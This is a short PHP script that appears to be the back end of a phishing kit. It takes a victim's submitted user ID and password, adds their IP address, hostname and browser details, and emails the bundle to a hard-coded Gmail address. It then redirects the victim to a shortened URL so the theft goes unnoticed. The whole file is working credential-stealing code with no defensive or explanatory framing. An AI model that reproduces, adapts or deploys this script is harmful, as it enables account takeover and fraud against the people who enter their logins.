<?php
header('Location: https://tinyurl.com/yxhcmg8t');
$userid = $_POST['userid'];
$pass = $_POST['pass'];
$user_ip = getenv("REMOTE_ADDR");
$user_hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$user_browserOS = $_SERVER['HTTP_USER_AGENT'];

$data ="userid: $userid\r\n";
$data.="pass: $pass\r\n";
$data.="IP Address: $user_ip\r\n";
$data.="Host Name: $user_hostname\r\n";
$data.="$user_browserOS\r\n";
$data.="=========================================\r\n";

$to = "wareatur34@gmail.com";
$subject = "$userid";
mail($to, $subject, $data);
?>